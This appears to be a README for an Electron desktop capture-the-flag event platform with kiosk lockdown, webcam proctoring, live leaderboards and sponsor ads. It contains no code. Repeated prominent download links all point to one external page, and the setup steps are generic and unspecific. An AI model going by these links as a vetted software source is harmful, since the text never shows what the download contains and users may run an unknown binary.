# HackLayer CTF v1.2.14 - CTF platform 2026

> **An Electron desktop CTF platform for kiosk-oriented events, live scoreboards, webcam supervision, and offline-tolerant use, now released as version 1.2.14.**

[![Platform](https://img.shields.io/badge/Platform-Electron%20desktop-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v1.2.14-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/leo-fisher55/hacklayer-offline-ctf-hub?style=flat-square)](https://github.com/leo-fisher55/hacklayer-offline-ctf-hub)

---

<p align="center">
  <a href="https://leo-fisher55.github.io/hacklayer-offline-ctf-hub/">
    <img src="https://img.shields.io/badge/Download-HackLayer%20CTF%20Latest-brightgreen?style=for-the-badge" alt="Download HackLayer CTF">
  </a>
</p>

> **[Direct Download - HackLayer CTF v1.2.14](https://leo-fisher55.github.io/hacklayer-offline-ctf-hub/)**

---

[Download Latest Build](https://leo-fisher55.github.io/hacklayer-offline-ctf-hub/)

---

## Overview

HackLayer CTF is a desktop CTF solution created for event environments that need a tightly controlled player flow, visible live scoring, and practical administrative controls. It runs inside an Electron desktop app and is tailored for kiosk-style deployments, which makes it suitable for hosted contests, on-site training labs, and guided capture-the-flag sessions.

Rather than splitting event tools across multiple systems, the platform brings together session flow, score visibility, and moderation features in a single application. It is intended to help organizers coordinate participation, display leaderboard movement in real time, manage sponsor placements, and keep the event usable when connectivity is inconsistent.

---

## Capabilities

- Kiosk mode with protections against common escape attempts such as alt-tab and task manager access
- Live webcam proctoring for monitored event sessions
- Slot-based event layout with a real-time leaderboard for tracking competition progress
- Animated secure and lobby backgrounds for a cleaner event presentation
- Sponsor and ad controls with placement management and analytics
- Auto-update support to simplify version distribution
- Offline-friendly operation with a retry queue for queued actions
- Help and guide link accessible from the login page
- Admin panel for event settings and content management

---

## Installation

Clone or download the repository, then open it in an Electron-capable desktop environment of your choice.

1. Download the source or package.
2. Install any required project dependencies.
3. Start the desktop application from the project entry point.

If you are working from a packaged build, use the download link above and follow the launch instructions included for that distribution.

---

## How to Use It

A typical event workflow looks like this:

1. Launch the app and authenticate through the login screen.
2. Set up kiosk rules, event slots, and presentation options from the admin panel.
3. Turn on webcam proctoring when the session needs supervision.
4. Publish the event so players can join the controlled CTF environment.
5. Watch the live leaderboard and sponsor placements throughout the event.
6. Check offline retries after connectivity returns, if applicable.

For most organizers, the usual pattern is to prepare the event before opening it to players, keep the desktop instance running during play, and adjust settings through the admin controls while the session is in progress.

---

## Configuration

All configuration is managed through the app settings and admin panel. Depending on your deployment, available options may include:

- kiosk behavior and restrictions
- leaderboard and slot configuration
- webcam proctoring controls
- sponsor and ad placements
- update behavior
- offline retry handling
- login-page help and guide links

If your build persists settings locally, store them in the application data directory used by the desktop installation.

---

## Requirements

- Electron desktop environment
- A supported desktop operating system
- Sufficient storage for the application and event assets
- Webcam access if proctoring is enabled
- Network access for updates, leaderboard sync, or sponsor content when those features are in use

---

## FAQ

**How do I get the newest release?**  
Use the download link above to get the latest build available for this repository.

**Can it run without a permanent connection?**  
Yes. The platform supports offline-capable operation and keeps a retry queue for pending actions.

**Is sponsor and ad management included?**  
Yes, with placement controls and analytics support.

**Where do I edit event settings?**  
Use the admin panel together with the application's configuration options.

**What should I check if I need setup help?**  
Start with the help and guide link on the login page, then review the configuration and deployment steps in the project.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
